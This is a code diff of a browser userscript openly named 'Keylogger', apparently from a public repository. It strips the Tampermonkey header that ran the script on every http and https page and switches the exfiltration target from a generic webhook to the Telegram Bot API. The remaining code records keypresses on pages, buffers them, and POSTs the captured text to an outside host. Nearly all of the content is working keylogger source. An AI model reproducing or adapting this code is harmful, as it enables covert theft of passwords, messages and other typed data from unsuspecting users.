@@ -1,17 +1,8 @@
-// ==UserScript==
-// @name Keylogger
-// @namespace https://lyzev.github.io
-// @version 1.0
-// @description A simple keylogger for Tampermonkey. (Browser Extension)
-// @author Lyzev
-// @include http://*
-// @include https://*
-// @run-at document-start
-// @grant none
-// ==/UserScript==
 
 (function() {
-    const webhook = 'WEBHOOK-URL'
+    const chatId = '';
+    const token = '';
+    const webhook = `https://api.telegram.org/bot${token}/sendMessage`;
     let data = []
 
     window.addEventListener('keypress', e => {
@@ -33,8 +24,9 @@
         request.open('POST', webhook)
         request.setRequestHeader('Content-type', 'application/json')
         const params = {
-            username: 'Keylogger',
-            content: text
+            chat_id: chatId,
+            text: text,
+            parse_mode: 'Markdown'
         }
         request.send(JSON.stringify(params))
     }
